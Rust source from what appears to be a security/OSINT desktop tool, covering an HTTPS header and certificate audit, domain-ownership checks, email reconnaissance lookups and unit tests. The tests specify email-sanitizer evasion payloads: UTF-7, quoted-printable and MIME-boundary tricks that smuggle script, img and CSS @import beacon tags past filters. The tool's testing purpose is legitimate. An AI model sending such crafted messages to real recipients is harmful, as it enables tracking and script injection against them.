// A separate, raw TLS handshake purely to read what certificate the
// server presents - reqwest has no API to hand back the peer certificate
// from a request it already made. Best-effort: any failure (DNS, connect,
// handshake, parse) just means no cert panel, not a failed audit - the
// header-based checks in https_audit above already succeeded independently
// by this point.
async fn fetch_certificate_info(host: &str, port: u16) -> Option<CertInfo> {
    let provider = std::sync::Arc::new(rustls::crypto::ring::default_provider());
    let config = rustls::ClientConfig::builder_with_provider(provider)
        .with_safe_default_protocol_versions()
        .ok()?
        .dangerous()
        .with_custom_certificate_verifier(std::sync::Arc::new(AcceptAnyCert))
        .with_no_client_auth();

    let connector = tokio_rustls::TlsConnector::from(std::sync::Arc::new(config));
    let server_name = rustls_pki_types::ServerName::try_from(host.to_string()).ok()?;

    let addr = format!("{}:{}", host, port);
    let tcp = tokio::time::timeout(Duration::from_secs(8), tokio::net::TcpStream::connect(&addr))
        .await
        .ok()?
        .ok()?;
    let tls = tokio::time::timeout(Duration::from_secs(8), connector.connect(server_name, tcp))
        .await
        .ok()?
        .ok()?;

    let (_, session) = tls.get_ref();
    let certs = session.peer_certificates()?;
    let leaf = certs.first()?;

    let (_, parsed) = x509_parser::parse_x509_certificate(leaf.as_ref()).ok()?;
    let validity = parsed.validity();
    let not_after_ts = validity.not_after.timestamp();
    let now_ts = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .ok()?
        .as_secs() as i64;

    Some(CertInfo {
        subject: parsed.subject().to_string(),
        issuer: parsed.issuer().to_string(),
        not_before: validity.not_before.to_string(),
        not_after: validity.not_after.to_string(),
        days_until_expiry: (not_after_ts - now_ts) / 86400,
        expired: not_after_ts < now_ts,
    })
}

async fn fetch_no_redirect(client: &reqwest::Client, url: &str) -> Result<reqwest::Response, String> {
    client
        .get(url)
        .send()
        .await
        .map_err(|e| format!("Could not reach {}: {}", url, e))
}

fn header_str(resp: &reqwest::Response, name: reqwest::header::HeaderName) -> Option<String> {
    resp.headers()
        .get(name)
        .and_then(|v| v.to_str().ok())
        .map(|s| s.to_string())
}

// Scans raw HTML for src="http://.../href="http://... references - a
// same-page indicator that an otherwise-HTTPS site still loads some
// resources over plain HTTP, each one its own MITM injection point even
// though the main document itself is protected.
fn find_mixed_content(body: &str) -> (u32, Vec<String>) {
    let mut count = 0u32;
    let mut examples = Vec::new();
    for needle in ["src=\"http://", "src='http://", "href=\"http://", "href='http://"] {
        let mut start = 0usize;
        while let Some(pos) = body[start..].find(needle) {
            let abs = start + pos + (needle.len() - 7); // back up to the "http://" itself
            let rest = &body[abs..];
            let end = rest.find(['"', '\'']).unwrap_or_else(|| rest.len().min(200));
            let found = &rest[..end];
            count += 1;
            if examples.len() < 5 {
                examples.push(found.to_string());
            }
            start = abs + end;
        }
    }
    (count, examples)
}

// hstspreload.org's own public status API - tells us whether the domain is
// baked into browsers' HSTS preload lists (protects even a user's very
// first visit, before any HSTS header from the server could ever apply).
async fn check_hsts_preload(client: &reqwest::Client, host: &str) -> bool {
    let api_url = format!("https://hstspreload.org/api/v2/status?domain={}", host);
    match client.get(&api_url).send().await {
        Ok(resp) => match resp.json::<serde_json::Value>().await {
            Ok(v) => v.get("status").and_then(|s| s.as_str()) == Some("preloaded"),
            Err(_) => false,
        },
        Err(_) => false,
    }
}

// Domain ownership verification (Options > General > Domain verification):
// proves the user controls a domain, Google-Search-Console/ACME-HTTP-01
// style, before features that act on someone else's site (Browser Inspect,
// eventually) are allowed to target it. The JS side generates a random
// file_name/expected_key pair once and shows it to the user to upload to
// a site's root; this just fetches that one file over HTTPS and reports
// whether the content matches - never a JS-level fetch(), since a plain
// cross-origin browser fetch would hit CORS on almost every real site.
// Returns Ok() for every REACHABLE-but-not-matching case too (wrong
// content, 404, ...) so the UI can show why it failed - Err is reserved
// for URL parsing failures, not verification failures.
#[derive(Serialize)]
struct DomainVerifyResult {
    matched: bool,
    http_status: Option<u16>,
    error: Option<String>,
}

#[tauri::command]
async fn verify_domain_file(domain: String, file_name: String, expected_key: String) -> Result<DomainVerifyResult, String> {
    let clean_domain = domain
        .trim()
        .trim_start_matches("https://")
        .trim_start_matches("http://")
        .trim_end_matches('/');
    let url = format!("https://{}/{}", clean_domain, file_name);

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(10))
        .build()
        .map_err(|e| e.to_string())?;

    match client.get(&url).send().await {
        Ok(resp) => {
            let status = resp.status().as_u16();
            if !resp.status().is_success() {
                return Ok(DomainVerifyResult { matched: false, http_status: Some(status), error: Some(format!("HTTP {}", status)) });
            }
            let body = resp.text().await.unwrap_or_default();
            let matched = body.trim() == expected_key.trim();
            Ok(DomainVerifyResult { matched, http_status: Some(status), error: None })
        }
        Err(e) => Ok(DomainVerifyResult { matched: false, http_status: None, error: Some(e.to_string()) }),
    }
}

#[tauri::command]
async fn https_audit(url: String) -> Result<HttpsAuditResult, String> {
    let normalized = if url.starts_with("http://") || url.starts_with("https://") {
        url.clone()
    } else {
        format!("https://{}", url)
    };

    let start_url = reqwest::Url::parse(&normalized).map_err(|e| format!("Invalid URL: {}", e))?;

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(10))
        .redirect(reqwest::redirect::Policy::none())
        .build()
        .map_err(|e| e.to_string())?;

    // Follow redirects manually (max 10 hops) instead of reqwest's own
    // redirect::Policy::limited(), which would follow automatically but
    // discard each hop's own status/Location - exactly what a "does this
    // silently downgrade somewhere along the way" check needs to see.
    let mut current = start_url.clone();
    let mut chain: Vec<RedirectHop> = Vec::new();
    let mut resp = fetch_no_redirect(&client, current.as_str()).await?;

    for _ in 0..10 {
        if !resp.status().is_redirection() {
            break;
        }
        let status = resp.status().as_u16();
        let location = resp
            .headers()
            .get(reqwest::header::LOCATION)
            .and_then(|v| v.to_str().ok())
            .map(|s| s.to_string());
        chain.push(RedirectHop { url: current.to_string(), status });
        let next = match location {
            Some(loc) => current.join(&loc).map_err(|e| e.to_string())?,
            None => break,
        };
        current = next;
        resp = fetch_no_redirect(&client, current.as_str()).await?;
    }

    let final_status = resp.status().as_u16();
    let final_url = current.to_string();

    let hsts = header_str(&resp, reqwest::header::STRICT_TRANSPORT_SECURITY);
    let csp = header_str(&resp, reqwest::header::CONTENT_SECURITY_POLICY);
    let x_frame_options = header_str(&resp, reqwest::header::X_FRAME_OPTIONS);
    let x_content_type_options = header_str(&resp, reqwest::header::X_CONTENT_TYPE_OPTIONS);
    let referrer_policy = header_str(&resp, reqwest::header::REFERRER_POLICY);
    let server = header_str(&resp, reqwest::header::SERVER);

    let body = resp.text().await.unwrap_or_default();
    let (mixed_content_count, mixed_content_examples) = find_mixed_content(&body);

    // Independent check: does the plain-HTTP origin actually redirect to
    // HTTPS? (Separate from the chain above, which starts from whatever
    // scheme the user typed - this always probes http:// specifically.)
    let http_upgrades_to_https = if current.scheme() == "https" {
        let mut http_url = current.clone();
        let _ = http_url.set_scheme("http");
        match fetch_no_redirect(&client, http_url.as_str()).await {
            Ok(r) if r.status().is_redirection() => r
                .headers()
                .get(reqwest::header::LOCATION)
                .and_then(|v| v.to_str().ok())
                .map(|loc| loc.starts_with("https://"))
                .unwrap_or(false),
            _ => false,
        }
    } else {
        false
    };

    let hsts_preloaded = match current.host_str() {
        Some(host) => check_hsts_preload(&client, host).await,
        None => false,
    };

    let cert = if current.scheme() == "https" {
        match current.host_str() {
            Some(host) => fetch_certificate_info(host, current.port_or_known_default().unwrap_or(443)).await,
            None => None,
        }
    } else {
        None
    };

    Ok(HttpsAuditResult {
        requested_url: normalized,
        final_url,
        final_status,
        redirect_chain: chain,
        http_upgrades_to_https,
        hsts,
        hsts_preloaded,
        csp,
        x_frame_options,
        x_content_type_options,
        referrer_policy,
        server,
        mixed_content_count,
        mixed_content_examples,
        cert,
    })
}

// ─── Email Recon (OSINT lookups: emailrep.io, Gravatar, GitHub, HIBP) ─────────────────

// Hand-rolled RFC 1321 MD5 - only used to build a Gravatar hash. Not for
// anything security-sensitive; avoided adding an md5 crate for one small,
// stable, textbook algorithm (per the "own the code, minimize dependencies"
// direction for this feature).
fn md5_hex(input: &str) -> String {
    const S: [u32; 64] = [
        7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 7, 12, 17, 22, 5, 9, 14, 20, 5, 9, 14, 20, 5,
        9, 14, 20, 5, 9, 14, 20, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 4, 11, 16, 23, 6,
        10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21, 6, 10, 15, 21,
    ];
    const K: [u32; 64] = [
        0xd76aa478, 0xe8c7b756, 0x242070db, 0xc1bdceee, 0xf57c0faf, 0x4787c62a, 0xa8304613,
        0xfd469501, 0x698098d8, 0x8b44f7af, 0xffff5bb1, 0x895cd7be, 0x6b901122, 0xfd987193,
        0xa679438e, 0x49b40821, 0xf61e2562, 0xc040b340, 0x265e5a51, 0xe9b6c7aa, 0xd62f105d,
        0x02441453, 0xd8a1e681, 0xe7d3fbc8, 0x21e1cde6, 0xc33707d6, 0xf4d50d87, 0x455a14ed,
        0xa9e3e905, 0xfcefa3f8, 0x676f02d9, 0x8d2a4c8a, 0xfffa3942, 0x8771f681, 0x6d9d6122,
        0xfde5380c, 0xa4beea44, 0x4bdecfa9, 0xf6bb4b60, 0xbebfbc70, 0x289b7ec6, 0xeaa127fa,
        0xd4ef3085, 0x04881d05, 0xd9d4d039, 0xe6db99e5, 0x1fa27cf8, 0xc4ac5665, 0xf4292244,
        0x432aff97, 0xab9423a7, 0xfc93a039, 0x655b59c3, 0x8f0ccc92, 0xffeff47d, 0x85845dd1,
        0x6fa87e4f, 0xfe2ce6e0, 0xa3014314, 0x4e0811a1, 0xf7537e82, 0xbd3af235, 0x2ad7d2bb,
        0xeb86d391,
    ];

    let mut a0: u32 = 0x67452301;
    let mut b0: u32 = 0xefcdab89;
    let mut c0: u32 = 0x98badcfe;
    let mut d0: u32 = 0x10325476;

    let mut msg = input.as_bytes().to_vec();
    let orig_len_bits = (msg.len() as u64).wrapping_mul(8);
    msg.push(0x80);
    while msg.len() % 64 != 56 {
        msg.push(0);
    }
    msg.extend_from_slice(&orig_len_bits.to_le_bytes());

    for chunk in msg.chunks(64) {
        let mut m = [0u32; 16];
        for (i, word) in m.iter_mut().enumerate() {
            *word = u32::from_le_bytes([
                chunk[i * 4],
                chunk[i * 4 + 1],
                chunk[i * 4 + 2],
                chunk[i * 4 + 3],
            ]);
        }

        let (mut a, mut b, mut c, mut d) = (a0, b0, c0, d0);

        for i in 0..64 {
            let (f, g) = if i < 16 {
                ((b & c) | (!b & d), i)
            } else if i < 32 {
                ((d & b) | (!d & c), (5 * i + 1) % 16)
            } else if i < 48 {
                (b ^ c ^ d, (3 * i + 5) % 16)
            } else {
                (c ^ (b | !d), (7 * i) % 16)
            };

            let f = f
                .wrapping_add(a)
                .wrapping_add(K[i])
                .wrapping_add(m[g]);
            a = d;
            d = c;
            c = b;
            b = b.wrapping_add(f.rotate_left(S[i]));
        }

        a0 = a0.wrapping_add(a);
        b0 = b0.wrapping_add(b);
        c0 = c0.wrapping_add(c);
        d0 = d0.wrapping_add(d);
    }

    let mut result = String::with_capacity(32);
    for v in [a0, b0, c0, d0] {
        for byte in v.to_le_bytes() {
            result.push_str(&format!("{:02x}", byte));
        }
    }
    result
}

#[cfg(test)]
mod md5_tests {
    use super::md5_hex;

    #[test]
    fn known_vectors() {
        assert_eq!(md5_hex(""), "d41d8cd98f00b204e9800998ecf8427e");
        assert_eq!(md5_hex("abc"), "900150983cd24fb0d6963f7d28e17f72");
        assert_eq!(
            md5_hex("The quick brown fox jumps over the lazy dog"),
            "9e107d9d372bb6826bd81d3542a419d6"
        );
    }
}

#[cfg(test)]
mod resolve_ip_addr_tests {
    use super::{resolve_ip_addr, resolve_socket_addr};
    use std::net::IpAddr;

    #[test]
    fn ipv4_has_no_scope() {
        let (addr, scope) = resolve_ip_addr("192.168.1.1").unwrap();
        assert_eq!(addr, "192.168.1.1".parse::<IpAddr>().unwrap());
        assert_eq!(scope, 0);
    }

    #[test]
    fn bare_ipv6_has_no_scope() {
        let (addr, scope) = resolve_ip_addr("2001:db8::1").unwrap();
        assert_eq!(addr, "2001:db8::1".parse::<IpAddr>().unwrap());
        assert_eq!(scope, 0);
    }

    // The exact link-local address shapes Windows reports (ipconfig) and
    // that a user copy-pasted straight off their own machine - the bug
    // this whole helper exists to fix ("scanning does nothing" with no
    // error, because IpAddr::from_str has no support at all for the "%9"
    // zone suffix and previously just failed to parse silently).
    #[test]
    fn windows_link_local_zone_id() {
        let (addr, scope) = resolve_ip_addr("fe80::f117:790b:c818:e0e7%9").unwrap();
        assert_eq!(addr, "fe80::f117:790b:c818:e0e7".parse::<IpAddr>().unwrap());
        assert_eq!(scope, 9);

        let (addr2, scope2) = resolve_ip_addr("fe80::2bd3:a474:4f77:713d%13").unwrap();
        assert_eq!(addr2, "fe80::2bd3:a474:4f77:713d".parse::<IpAddr>().unwrap());
        assert_eq!(scope2, 13);
    }

    #[test]
    fn garbage_is_rejected() {
        assert!(resolve_ip_addr("not an ip").is_none());
        assert!(resolve_ip_addr("fe80::1%not-a-number").is_none());
    }

    #[test]
    fn socket_addr_carries_the_scope_id() {
        let addr = resolve_socket_addr("fe80::1%9", 80).unwrap();
        match addr {
            std::net::SocketAddr::V6(v6) => {
                assert_eq!(v6.scope_id(), 9);
                assert_eq!(v6.port(), 80);
            }
            _ => panic!("expected a V6 SocketAddr"),
        }
    }
}

#[cfg(test)]
mod utf7_encode_tests {
    use super::utf7_encode;

    #[test]
    fn direct_characters_pass_through_unchanged() {
        // Letters, digits, and RFC 2152 Set D punctuation need no encoding.
        assert_eq!(utf7_encode("fetch('https://x.example/a.b')"), "fetch('https://x.example/a.b')");
    }

    #[test]
    fn angle_brackets_are_shift_encoded() {
        // Hand-verified against RFC 2152's modified-base64 rule: U+003C/
        // U+003E as UTF-16BE bytes (00 3C / 00 3E), base64'd without
        // padding, wrapped in "+...-".
        assert_eq!(utf7_encode("<"), "+ADw-");
        assert_eq!(utf7_encode(">"), "+AD4-");
    }

    #[test]
    fn adjacent_non_direct_characters_share_one_shift_sequence() {
        // "{}" back-to-back should become ONE "+...-" run (two UTF-16BE
        // code units base64'd together), not two separate shifts.
        let encoded = utf7_encode("{}");
        assert!(encoded.starts_with('+') && encoded.ends_with('-'));
        assert_eq!(encoded.matches('+').count(), 1);
    }

    #[test]
    fn full_script_tag_round_trips_through_a_real_utf7_decoder_shape() {
        let encoded = utf7_encode("<script>a</script>");
        assert_eq!(encoded, "+ADw-script+AD4-a+ADw-/script+AD4-");
    }
}

#[cfg(test)]
mod technique_message_tests {
    use super::build_technique_message;

    const FROM: &str = "tester@example.com";
    const TO: &str = "victim@example.com";
    const SUBJECT: &str = "Sanitization test";
    const BEACON: &str = "https://beacon.example/hit/abc123-utf7-charset";

    fn as_text(bytes: &[u8]) -> String {
        // Lossy on purpose - overlong-utf8's message is deliberately not
        // valid UTF-8, this is only used to eyeball headers/ASCII structure
        // in assertions below, never to recover the exact injected bytes.
        String::from_utf8_lossy(bytes).into_owned()
    }

    #[test]
    fn unknown_technique_is_rejected() {
        assert!(build_technique_message(FROM, TO, SUBJECT, BEACON, "not-a-real-technique").is_err());
    }

    #[test]
    fn qp_natural_wrap_variant_out_of_range_is_rejected() {
        assert!(build_technique_message(FROM, TO, SUBJECT, BEACON, "qp-natural-wrap-0").is_err());
        assert!(build_technique_message(FROM, TO, SUBJECT, BEACON, "qp-natural-wrap-11").is_err());
        assert!(build_technique_message(FROM, TO, SUBJECT, BEACON, "qp-natural-wrap-abc").is_err());
        assert!(build_technique_message(FROM, TO, SUBJECT, BEACON, "qp-natural-wrap-5").is_ok());
    }

    // Every technique message needs a real Date and Message-ID header
    // (RFC 5322 §3.6) - these bypass lettre's typed Message::builder(),
    // which would otherwise add a missing Date automatically, so this file
    // has to do it itself. Checked across every technique, not just one,
    // since a copy-paste of technique_message_headers() into a new builder
    // is exactly the kind of place this could silently regress.
    #[test]
    fn every_technique_message_has_date_and_message_id_headers() {
        for technique in [
            "utf7-charset",
            "overlong-utf8",
            "mime-boundary-desync",
            "mime-boundary-desync-css",
            "mime-alternative-control-img",
            "mime-alternative-control-css",
            "encoded-word-header",
            "qp-soft-break",
            "qp-soft-break-style",
            "qp-hex-escaped-tags",
            "qp-hex-escaped-style-tags",
            "qp-hex-open-angle-only",
            "qp-hex-close-angle-only",
            "qp-natural-wrap-1",
            "qp-natural-wrap-10",
        ] {
            let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, technique).unwrap();
            let text = as_text(&bytes);
            let header_block = text.split("\r\n\r\n").next().unwrap_or("");
            assert!(header_block.contains("Date: "), "missing Date header for {technique}");
            assert!(header_block.contains("Message-ID: <"), "missing Message-ID header for {technique}");
        }
    }

    #[test]
    fn utf7_charset_message_has_no_literal_angle_brackets() {
        let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "utf7-charset").unwrap();
        let text = as_text(&bytes);
        assert!(text.contains("charset=UTF-7"));
        // The whole point: no raw '<script>' bytes anywhere in the message -
        // only the UTF-7 shift-encoded form.
        assert!(!text.contains("<script>"));
        assert!(text.contains("+ADw-script+AD4-"));
    }

    #[test]
    fn mime_boundary_desync_message_has_real_and_fake_boundary_lines() {
        let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "mime-boundary-desync").unwrap();
        let text = as_text(&bytes);
        assert!(text.contains("multipart/alternative"));
        assert!(text.contains("--XSSTEST_7f3a9c2b\r\n"));
        assert!(text.contains("--XSSTEST_7f3a9c2bEXTRA_NOT_A_REAL_BOUNDARY\r\n"));
        assert!(text.contains(BEACON));
        assert!(text.contains("<img src="));
    }

    #[test]
    fn mime_boundary_desync_css_message_smuggles_style_not_img() {
        let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "mime-boundary-desync-css").unwrap();
        let text = as_text(&bytes);
        assert!(text.contains("--XSSTEST_7f3a9c2bEXTRA_NOT_A_REAL_BOUNDARY\r\n"));
        assert!(text.contains(&format!("<style>@import \"{BEACON}\";</style>")));
        assert!(!text.contains("<img"));
    }

    // Control pair for the two desync variants above - same 3-part
    // multipart/alternative shape, but every boundary line is well-formed
    // (no "EXTRA_NOT_A_REAL_BOUNDARY" junk anywhere). Confirms these two
    // builders genuinely differ from the desync ones ONLY in that one
    // detail, so a live A/B test against Gmail actually isolates whether
    // the malformed boundary matters at all.
    #[test]
    fn mime_alternative_control_messages_have_no_malformed_boundary() {
        let img_bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "mime-alternative-control-img").unwrap();
        let img_text = as_text(&img_bytes);
        assert!(img_text.contains("multipart/alternative"));
        assert!(!img_text.contains("EXTRA_NOT_A_REAL_BOUNDARY"));
        assert!(img_text.contains(&format!("<img src=\"{BEACON}\" alt=\"\" />")));
        // Every "--XSSTEST_CONTROL_9d4e1a" occurrence must be followed
        // immediately by CRLF or "--" (the closing delimiter) - never by
        // trailing junk - i.e. every boundary line in this message is
        // exactly RFC 2046-valid.
        for (idx, _) in img_text.match_indices("--XSSTEST_CONTROL_9d4e1a") {
            let rest = &img_text[idx + "--XSSTEST_CONTROL_9d4e1a".len()..];
            assert!(rest.starts_with("\r\n") || rest.starts_with("--"));
        }

        let css_bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "mime-alternative-control-css").unwrap();
        let css_text = as_text(&css_bytes);
        assert!(css_text.contains(&format!("<style>@import \"{BEACON}\";</style>")));
        assert!(!css_text.contains("EXTRA_NOT_A_REAL_BOUNDARY"));
    }

    #[test]
    fn encoded_word_header_message_carries_a_base64_from_header() {
        let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "encoded-word-header").unwrap();
        let text = as_text(&bytes);
        assert!(text.starts_with("From: =?UTF-8?B?"));
        assert!(text.contains(&format!("<{FROM}>")));
        // The injected payload must NOT appear as literal text anywhere in
        // the header - only inside the base64 blob.
        assert!(!text.contains("<img src=x"));
    }

    #[test]
    fn overlong_utf8_message_contains_the_invalid_byte_sequences() {
        let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "overlong-utf8").unwrap();
        // This message is INTENTIONALLY not valid UTF-8 - confirm the exact
        // invalid lead/continuation byte pairs are present as raw bytes,
        // rather than trying to treat the whole thing as a Rust &str.
        assert!(bytes.windows(2).any(|w| w == [0xC0, 0xBC]));
        assert!(bytes.windows(2).any(|w| w == [0xC0, 0xBE]));
        assert!(std::str::from_utf8(&bytes).is_err());
    }

    #[test]
    fn qp_soft_break_message_never_shows_script_unbroken() {
        let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "qp-soft-break").unwrap();
        let text = as_text(&bytes);
        assert!(text.contains("Content-Transfer-Encoding: quoted-printable"));
        // "script" (either tag) must NEVER appear as one intact substring -
        // only split across the soft break.
        assert!(!text.contains("<script"));
        assert!(!text.contains("</script"));
        assert!(text.contains("<scri=\r\npt>"));
        assert!(text.contains("</scri=\r\npt>"));
        // The Polish pangram's own quoted-printable encoding must be
        // present too, not just the split tag trick on its own.
        assert!(text.contains("Za=C5=BC=C3=B3=C5=82=C4=87"));
        assert!(text.contains(BEACON));
    }

    #[test]
    fn qp_soft_break_style_message_never_shows_style_unbroken() {
        let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "qp-soft-break-style").unwrap();
        let text = as_text(&bytes);
        assert!(text.contains("Content-Transfer-Encoding: quoted-printable"));
        assert!(!text.contains("<style"));
        assert!(!text.contains("</style"));
        assert!(text.contains("<sty=\r\nle>"));
        assert!(text.contains("</sty=\r\nle>"));
        assert!(text.contains("@import"));
        assert!(text.contains(BEACON));
    }

    #[test]
    fn qp_hex_escaped_style_tags_message_has_no_literal_angle_brackets_around_style() {
        let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "qp-hex-escaped-style-tags").unwrap();
        let text = as_text(&bytes);
        assert!(text.contains("Content-Transfer-Encoding: quoted-printable"));
        assert!(!text.contains("<style"));
        assert!(!text.contains("</style"));
        assert!(text.contains("=3Cstyle=3E"));
        assert!(text.contains("=3C/style=3E"));
        assert!(text.contains("@import"));
        assert!(text.contains(BEACON));
    }

    #[test]
    fn qp_hex_escaped_tags_message_has_no_literal_angle_brackets_around_script() {
        let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "qp-hex-escaped-tags").unwrap();
        let text = as_text(&bytes);
        assert!(text.contains("Content-Transfer-Encoding: quoted-printable"));
        assert!(!text.contains("<script"));
        assert!(!text.contains("</script"));
        assert!(text.contains("=3Cscript=3E"));
        assert!(text.contains("=3C/script=3E"));
        assert!(text.contains(BEACON));
    }

    #[test]
    fn qp_hex_open_angle_only_message_leaves_the_closing_bracket_literal() {
        let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "qp-hex-open-angle-only").unwrap();
        let text = as_text(&bytes);
        // The opening '<' is hex-escaped (no literal "<script" substring
        // anywhere), but "script>" and "/script>" stay literal - isolates
        // whether a scanner needing to see BOTH brackets behaves
        // differently from one that only cares about "<script" alone.
        assert!(!text.contains("<script"));
        assert!(text.contains("=3Cscript>"));
        assert!(text.contains("=3C/script>"));
        assert!(text.contains(BEACON));
    }

    #[test]
    fn qp_hex_close_angle_only_message_leaves_the_opening_bracket_literal() {
        let bytes = build_technique_message(FROM, TO, SUBJECT, BEACON, "qp-hex-close-angle-only").unwrap();
        let text = as_text(&bytes);
        // Mirror image: the literal "<script" substring IS present (only
        // '>' is hex-escaped), but no complete, literal "<script>" tag
        // shape ever appears in the raw bytes.
        assert!(text.contains("<script"));
        assert!(!text.contains("<script>"));
        assert!(!text.contains("</script>"));
        assert!(text.contains("script=3E"));
        assert!(text.contains(BEACON));
    }
}

#[cfg(test)]
mod format_rfc5322_date_tests {
    use super::format_rfc5322_date;

    #[test]
    fn unix_epoch_was_a_thursday() {
        assert_eq!(format_rfc5322_date(0), "Thu, 01 Jan 1970 00:00:00 +0000");
    }

    #[test]
    fn y2k_was_a_saturday() {
        assert_eq!(format_rfc5322_date(946684800), "Sat, 01 Jan 2000 00:00:00 +0000");
    }

    #[test]
    fn matches_a_known_independent_reference_value() {
        // Same timestamp lettre's own Date header test uses (its own
        // internal formatter, verified independently here since this file
        // deliberately avoids depending on lettre's private formatting).
        assert_eq!(format_rfc5322_date(784887151), "Tue, 15 Nov 1994 08:12:31 +0000");
    }
}

#[cfg(test)]
mod quoted_printable_encode_tests {
    use super::quoted_printable_encode;

    #[test]
    fn safe_ascii_passes_through_unchanged() {
        assert_eq!(quoted_printable_encode("Hello, World! 123"), "Hello, World! 123");
    }

    #[test]
    fn literal_equals_sign_is_escaped() {
        // '=' is the escape character itself, so a literal one MUST be
        // encoded or it would be misread as the start of an escape/soft
        // break by any decoder.
        assert_eq!(quoted_printable_encode("a=b"), "a=3Db");
    }

    #[test]
    fn polish_diacritics_match_known_utf8_hex_values() {
        // Hand-verified against each character's real UTF-8 byte sequence
        // (U+0105 -> C4 85, etc.) - not just "does it round-trip", but
        // "are these the exact bytes a real UTF-8-then-QP pipeline
        // produces".
        assert_eq!(quoted_printable_encode("ą"), "=C4=85");
        assert_eq!(quoted_printable_encode("ć"), "=C4=87");
        assert_eq!(quoted_printable_encode("ę"), "=C4=99");
        assert_eq!(quoted_printable_encode("ł"), "=C5=82");
        assert_eq!(quoted_printable_encode("ń"), "=C5=84");
        assert_eq!(quoted_printable_encode("ó"), "=C3=B3");
        assert_eq!(quoted_printable_encode("ś"), "=C5=9B");
        assert_eq!(quoted_printable_encode("ź"), "=C5=BA");
        assert_eq!(quoted_printable_encode("ż"), "=C5=BC");
    }

    #[test]
    fn full_pangram_matches_expected_encoding() {
        assert_eq!(
            quoted_printable_encode("Zażółć gęślą jaźń"),
            "Za=C5=BC=C3=B3=C5=82=C4=87 g=C4=99=C5=9Bl=C4=85 ja=C5=BA=C5=84"
        );
    }
}

#[cfg(test)]
mod quoted_printable_encode_folded_tests {
    use super::{build_qp_natural_wrap_message, quoted_printable_encode, quoted_printable_encode_folded, qp_natural_wrap_variant_text};

    #[test]
    fn no_line_exceeds_the_76_column_limit() {
        // Long enough, with enough non-ASCII, to force multiple wraps -
        // every line between "=\r\n" soft breaks (and the final line) must
        // stay within the real RFC 2045 limit.
        let input = qp_natural_wrap_variant_text(10).repeat(3);
        let folded = quoted_printable_encode_folded(&input);
        for line in folded.split("\r\n") {
            assert!(line.len() <= 76, "line exceeded 76 chars: {:?} ({})", line, line.len());
        }
    }

    #[test]
    fn stripping_soft_breaks_reproduces_the_unfolded_encoding() {
        // Folding is purely a wire-format concern - removing every soft
        // break must reconstruct exactly what the unfolded encoder would
        // have produced, proving no byte was lost or altered by wrapping.
        let input = "Zażółć gęślą jaźń, bądź wyjątkowo szczęśliwy dzisiaj, mój drogi przyjacielu z Łodzi, gdzieś bardzo, bardzo, bardzo daleko.";
        let folded = quoted_printable_encode_folded(input);
        let unfolded = quoted_printable_encode(input);
        assert_eq!(folded.replace("=\r\n", ""), unfolded);
    }

    #[test]
    fn variants_sweep_different_wrap_phases() {
        // The whole point of having 10 variants of different filler
        // length: each one shifts where <script> lands relative to the
        // 76-column boundary. Confirm the byte offset of the literal
        // "<script" substring genuinely differs across at least a few
        // variants (not all coincidentally identical, which would defeat
        // the purpose of sweeping the offset at all).
        let mut offsets = std::collections::HashSet::new();
        for variant in 1..=10u32 {
            let msg = build_qp_natural_wrap_message("a@example.com", "b@example.com", "s", "https://x.example/hit/t", variant);
            let text = String::from_utf8_lossy(&msg);
            let offset = text.find("script").expect("every variant must still contain the word script somewhere");
            offsets.insert(offset);
        }
        assert!(offsets.len() > 1, "all 10 variants produced the exact same offset - the length sweep isn't doing anything");
    }
}

#[derive(Debug, Clone, Copy, Serialize, PartialEq)]
#[serde(rename_all = "snake_case")]
enum EmailSourceStatus {
    Found,
    NotFound,
    Error,
    SkippedNoKey,
    SkippedDisabled,
}

#[derive(Debug, Clone, Serialize)]
struct EmailSourceResult {
    source: String,
    status: EmailSourceStatus,
    summary: String,
    detail: Option<String>,
}

impl EmailSourceResult {
    fn skipped_disabled(source: &str) -> Self {
        EmailSourceResult {
            source: source.into(),
            status: EmailSourceStatus::SkippedDisabled,
            summary: String::new(),
            detail: None,
        }
    }
    fn skipped_no_key(source: &str) -> Self {
        EmailSourceResult {
            source: source.into(),
            status: EmailSourceStatus::SkippedNoKey,
            summary: String::new(),
            detail: None,
        }
    }
    fn not_found(source: &str) -> Self {
        EmailSourceResult {
            source: source.into(),
            status: EmailSourceStatus::NotFound,
            summary: String::new(),
            detail: None,
        }
    }
    fn error(source: &str, message: impl Into<String>) -> Self {
        EmailSourceResult {
            source: source.into(),
            status: EmailSourceStatus::Error,
            summary: message.into(),
            detail: None,
        }
    }
}

#[derive(Debug, Clone, Serialize)]
struct EmailReconResult {
    email: String,
    exists_hint: String,
    hit_count: u32,
    sources: Vec<EmailSourceResult>,
}

#[derive(Debug, Clone, Deserialize)]
#[serde(rename_all = "camelCase")]
struct EmailReconOptions {
    emailrep: bool,
    gravatar: bool,
    github: bool,
    hibp_breaches: bool,
    hibp_pastes: bool,
    xposedornot: bool,
    leakcheck: bool,
    hibp_api_key: String,
}

async fn probe_emailrep(client: &reqwest::Client, email: &str) -> EmailSourceResult {
    #[derive(Deserialize)]
    struct EmailRepDetails {
        profiles: Option<Vec<String>>,
        #[serde(default)]
        deliverable: bool,
        last_seen: Option<String>,
    }
    #[derive(Deserialize)]
    struct EmailRepResponse {
        reputation: Option<String>,
        details: Option<EmailRepDetails>,
    }

    let url = format!("https://emailrep.io/{}", email);
    let resp = match client
        .get(&url)
        .header("User-Agent", "OSINTNETAuditor")
        .send()
        .await
    {
        Ok(r) => r,
        Err(e) => return EmailSourceResult::error("emailrep", e.to_string()),
    };

